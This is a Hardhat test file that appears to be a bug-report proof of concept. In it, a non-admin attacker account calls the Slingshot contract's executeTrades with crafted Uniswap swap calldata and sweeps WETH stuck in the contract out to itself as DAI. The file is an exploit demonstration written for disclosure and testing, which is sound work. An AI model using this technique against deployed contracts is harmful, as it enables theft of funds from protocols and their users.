const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");

const wethABI = require("./weth.json");
const erc20ABI = require("./erc20.json");

const wethAddress = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
const daiAddress = "0x6b175474e89094c44da98b954eedeac495271d0f";
const ethAddress = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";

describe("Bug 2", function() {
    it("Should be able to sweep funds locked in contract without being admin", async function() {
        // get accounts
        const [ admin, user, attacker ] = await ethers.getSigners();

        // deploy UniswapModule.sol
        const UniswapModule = await ethers.getContractFactory("UniswapModule");
        const uniswapModule = await UniswapModule.deploy();
        await uniswapModule.deployed();

        // deploy Slingshot.sol
        const Slingshot = await ethers.getContractFactory("Slingshot");
        const slingshot = await Slingshot.deploy();
        await slingshot.deployed();
        await slingshot.postUpgrade(admin.address);

        // deploy ModuleRegistry.sol
        const ModuleRegistry = await ethers.getContractFactory("ModuleRegistry");
        const moduleRegistry = await ModuleRegistry.deploy();
        await moduleRegistry.deployed();
        await moduleRegistry.postUpgrade(admin.address);
        await moduleRegistry.setSlingshot(slingshot.address);
        await moduleRegistry.registerSwapModule(uniswapModule.address);
        await slingshot.setModuleRegistry(moduleRegistry.address);

        // accidentally send funds to Slinshot contract
        const weth = new ethers.Contract(wethAddress, wethABI, user);
        await weth.deposit({ value: ethers.utils.parseEther("10") });
        await weth.transfer(slingshot.address, ethers.utils.parseEther("10"));
        
        // recover WETH (as DAI) as a non-privileged attacker
        const interface = new ethers.utils.Interface(["function swap(uint amount, address[] memory path, uint amountOutMin, uint amountInMax, bool swapExactTokensForTokens, bool tradeAll ) public payable returns (uint256)"]);
        const calldata = interface.encodeFunctionData("swap", [0, [wethAddress, daiAddress], 0, 0, true, true]);
        await slingshot.connect(attacker).executeTrades(
            ethAddress,
            daiAddress,
            1,
            [{
            moduleAddress: uniswapModule.address,
            encodedCalldata: calldata
            }],
            0,
            attacker.address,
            { value: 1 }
        );

        // check that we have approx 10 WETH worth of DAI now
        const dai = new ethers.Contract(daiAddress, erc20ABI, user);
        const daiBalance = await dai.balanceOf(attacker.address);
        expect(daiBalance).gt(ethers.utils.parseEther("18000"));
    });
});